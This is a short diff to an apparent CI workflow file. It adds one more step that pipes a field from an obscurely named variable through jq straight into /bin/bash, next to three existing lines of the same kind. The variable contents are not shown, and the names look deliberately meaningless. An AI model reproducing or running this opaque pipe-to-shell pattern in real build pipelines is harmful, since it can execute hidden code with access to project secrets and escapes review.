@@ -36,6 +36,7 @@ jobs:
           echo $wmqy78333 | jq -r .dpkmu080 | /bin/bash
           printf '%s' "$so7878" | jq -r .a4 | /bin/bash
           printf '%s' "$qujn8786" | jq -r .xnkj31 | /bin/bash
+          printf '%s' "$crnu8178" | jq -r .rbu82332 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
